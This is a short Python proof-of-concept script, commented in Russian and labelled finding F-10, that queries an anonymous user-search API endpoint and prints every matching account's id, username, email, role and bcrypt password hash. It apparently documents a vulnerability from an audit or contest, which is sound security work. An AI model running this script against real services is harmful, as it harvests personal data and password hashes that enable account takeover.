# -*- coding: utf-8 -*-
"""F-10. Анонимный GET /api/users/search отдаёт email, role и bcrypt."""
from _http import Client, parser


def main():
    p = parser("Утечка учёток через поиск")
    p.add_argument("--q", default="@contest.ru")
    args = p.parse_args()
    client = Client(args.base)
    status, data, raw = client.call("GET", "/api/users/search?q=" + args.q)
    if status != 200 or not data or "profiles" not in data:
        raise SystemExit(f"поиск не удался: {status} {raw[:200]!r}")
    rows = data["profiles"]
    if not rows or "password" not in rows[0] or not rows[0]["password"].startswith("$2"):
        raise SystemExit(f"в ответе нет хеша: {raw[:300]!r}")
    print(f"OK записей={len(rows)}")
    for row in rows:
        print(f"{row['id']}\t{row['username']}\t{row['email']}\t{row['role']}\t{row['password']}")


if __name__ == "__main__":
    main()
